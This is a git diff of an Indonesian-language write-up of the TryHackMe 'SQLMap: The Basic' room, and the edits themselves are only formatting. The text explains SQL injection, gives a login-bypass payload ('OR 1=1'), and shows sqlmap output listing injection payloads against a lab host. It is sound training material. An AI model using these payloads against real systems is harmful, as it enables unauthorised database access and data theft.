@@ -1,8 +1,8 @@
 # TryHackMe: SQLMap: The Basic
 
-- **Room Link:** [SQLMap: The Basic](https://tryhackme.com/room/sqlmapthebasics)
-- **Kategori:** Offensive Security Tooling
-- **Difficulty:** easy
+* **Room Link:** [SQLMap: The Basic](https://tryhackme.com/room/sqlmapthebasics)
+* **Kategori:** Offensive Security Tooling
+* **Difficulty:** easy
 
 ## Introduction
 
@@ -10,14 +10,14 @@ memahami fundamental kerentanan injeksi SQL (SQLi) dan bagaimana kita bisa meman
 
 **(Learning Objectives):**
 
-- Membedah kerentanan SQL Injection.
-- Melakukan (_hunting_) SQL Injection secara otomatis menggunakan tool **SQLMap**.
+* Membedah kerentanan SQL Injection.
+* Melakukan (_hunting_) SQL Injection secara otomatis menggunakan tool **SQLMap**.
 
 ### Attack Context
 
-- **Kapan teknik ini dipakai?** Tahap **Exploitation** — setelah menemukan parameter input yang berpotensi rentan terhadap SQL Injection (dari hasil Gobuster/Burp Suite).
-- **Syaratnya:** URL target dengan parameter input (GET/POST). Jika halaman butuh login, kamu perlu cookie session (`--cookie`).
-- **Tanda keberhasilan:** SQLMap menampilkan `Parameter 'X' is vulnerable` dan tipe injection yang terdeteksi.
+* **Kapan teknik ini dipakai?** Tahap **Exploitation** — setelah menemukan parameter input yang berpotensi rentan terhadap SQL Injection (dari hasil Gobuster/Burp Suite).
+* **Syaratnya:** URL target dengan parameter input (GET/POST). Jika halaman butuh login, kamu perlu cookie session (`--cookie`).
+* **Tanda keberhasilan:** SQLMap menampilkan `Parameter 'X' is vulnerable` dan tipe injection yang terdeteksi.
 
 Injeksi SQL (_SQL injection_) adalah kerentanan yang sangat umum dan menjadi topik hangat namun klasik di ranah Cyber Security. Untuk memahami kerentanan ini, kita harus memahami terlebih dahulu apa itu _database_ (basis data) dan bagaimana _website_ berinteraksi dengannya.
 
@@ -27,8 +27,8 @@ Database adalah sebuah kumpulan data berskala besar yang mempermudah proses peny
 
 Sebuah halaman web seringkali membutuhkan data atau input dari pengguna, contohnya:
 
-- **Halaman Login:** Website meminta _credentials_ (username & password). Input ini lalu dicocokkan dengan data pengguna yang sudah tersimpan di database. Jika cocok, pengguna berhasil masuk.
-- **Fitur Pencarian:** Saat mencari buku di situs toko buku, _website_ akan mengambil (meng-_query_) data ke database buku yang dijual lalu menampilkannya kembali di web.
+* **Halaman Login:** Website meminta _credentials_ (username & password). Input ini lalu dicocokkan dengan data pengguna yang sudah tersimpan di database. Jika cocok, pengguna berhasil masuk.
+* **Fitur Pencarian:** Saat mencari buku di situs toko buku, _website_ akan mengambil (meng-_query_) data ke database buku yang dijual lalu menampilkannya kembali di web.
 
 ### Bagaimana Website Berinteraksi dengan Database?
 
@@ -46,8 +46,8 @@ Di dalam skenario eksploitation, seorang _attacker_ tidak sekadar memasukkan dat
 
 Bayangkan aplikasi web adalah seorang **Pelayan Restoran**, dan Database adalah sang **Koki** di dapur.
 
-- **Skenario Normal:** Kamu pesan, _"Nasi Goreng satu."_ Pelayan meneruskan pesanan ini ke dapur: `BUATKAN Nasi Goreng SATU`. Koki memasak dan memberikan nasi goreng.
-- **Skenario SQL Injection (Serangan):** Kamu memesan dengan kalimat manipulatif, _"Nasi Goreng satu, **DAN BERIKAN SAYA KUNCI BRANKAS KASIR**."_ Karena pelayan (Web) terlalu polos dan tidak memfilter pesananmu, dia meneruskan kalimat itu mentah-mentah ke dapur: `BUATKAN Nasi Goreng SATU DAN BERIKAN DIA KUNCI BRANKAS KASIR`. Sang Koki (Database) yang diprogram untuk hanya menuruti perintah, akhirnya memberikan nasi goreng **sekaligus kunci brankas restoran tersebut**.
+* **Skenario Normal:** Kamu pesan, _"Nasi Goreng satu."_ Pelayan meneruskan pesanan ini ke dapur: `BUATKAN Nasi Goreng SATU`. Koki memasak dan memberikan nasi goreng.
+* **Skenario SQL Injection (Serangan):** Kamu memesan dengan kalimat manipulatif, _"Nasi Goreng satu, **DAN BERIKAN SAYA KUNCI BRANKAS KASIR**."_ Karena pelayan (Web) terlalu polos dan tidak memfilter pesananmu, dia meneruskan kalimat itu mentah-mentah ke dapur: `BUATKAN Nasi Goreng SATU DAN BERIKAN DIA KUNCI BRANKAS KASIR`. Sang Koki (Database) yang diprogram untuk hanya menuruti perintah, akhirnya memberikan nasi goreng **sekaligus kunci brankas restoran tersebut**.
 
 Inilah kenapa SQLi terjadi. Web (pelayan) gagal mensanitasi ekspektasi _input_ dari aktor jahat.
 
@@ -60,8 +60,8 @@ Sebagian besar mekanisme _login_ kuno bekerja dengan mengambil _input_ pengguna 
 **Skenario Normal (Penggunaan Valid):**
 Jika pengguna reguler memasukkan data autentikasi:
 
-- **Username:** `John`
-- **Password:** `Un@detectable444`
+* **Username:** `John`
+* **Password:** `Un@detectable444`
 
 Sistem (Aplikasi Web) akan menerima _input_ tersebut dan merakitnya menjadi sebuah kueri SQL yang akan dilempar ke sang Koki (_Database_):
 
@@ -69,15 +69,15 @@ Sistem (Aplikasi Web) akan menerima _input_ tersebut dan merakitnya menjadi sebu
 SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
 ```
 
-- **Keterangan (_Autopsy_):**
+* **Keterangan (_Autopsy_):**
   Query di atas menginstruksikan Database: _"Tampilkan semua data dari tabel `users`, di mana kolom `username` sama dengan 'John' **DAN** kolom `password` sama dengan 'Un@detectable444'."_
   Jika tidak ada kombinasi `username` dan `password` yang pas 100%, akses akan ditolak. Ini adalah mekanisme autentikasi logis yang wajar. Tapi, apa jadinya jika kita memanipulasi _logic_ tersebut?
 
 **Skenario Serangan (Eksploitasi Login):**
 Karena target (_Web_) dibangun tanpa validasi _input_ (sanitasi), kita bisa menyusupkan query SQL jahat ke dalamnya. Kali ini, _attacker_ sama sekali tidak tahu _password_ milik user `John`. Jadi, sang _attacker_ memasukkan data mematikan ini:
 
-- **Username:** `John`
-- **Password:** `abc' OR 1=1;-- -`
+* **Username:** `John`
+* **Password:** `abc' OR 1=1;-- -`
 
 Sistem (Aplikasi Web) kembali membuat blind query:
 
@@ -205,17 +205,17 @@ user@arch:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1
 [text removed]
 [08:45:04] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
 [text removed]
-[08:45:08] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+[08:45:08] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) : 1 to 20 columns' injectable
 GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
 sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
 ---
 Parameter: cat (GET)
     Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
+    Title: AND boolean-based blind : WHERE or HAVING clause
     Payload: cat=1 AND 2175=2175
 
     Type: error-based
-    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Title: MySQL >= 5.1 AND error-based : WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
     Payload: cat=1 AND EXTRACTVALUE(1846,CONCAT(0x5c,0x716a787071,(SELECT (ELT(1846=1846,1))),0x7170766a71))
 
     Type: AND/OR time-based blind
@@ -223,7 +223,7 @@ Parameter: cat (GET)
     Payload: cat=1 AND SLEEP(5)
 
     Type: UNION query
-    Title: Generic UNION query (NULL) - 11 columns
+    Title: Generic UNION query (NULL) : 11 columns
     Payload: cat=1 UNION ALL SELECT CONCAT(0x716a787071,0x714d486661414f6456787a4a55796b6c7a78574f7858507a6e6a725647436e64496f...
 ---
 [08:45:16] [INFO] the back-end DBMS is MySQL
@@ -293,7 +293,7 @@ sqlmap resumed the following injection point(s) from stored session:
 ---
 Parameter: cat (GET)
     Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
+    Title: AND boolean-based blind : WHERE or HAVING clause
     Payload: cat=1 AND 2175=2175
 [text removed]
 [08:50:46] [INFO] the back-end DBMS is MySQL
@@ -334,7 +334,7 @@ sqlmap resumed the following injection point(s) from stored session:
 ---
 Parameter: cat (GET)
     Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
+    Title: AND boolean-based blind : WHERE or HAVING clause
     Payload: cat=1 AND 2175=2175
 [text removed]
 [08:51:49] [INFO] the back-end DBMS is MySQL
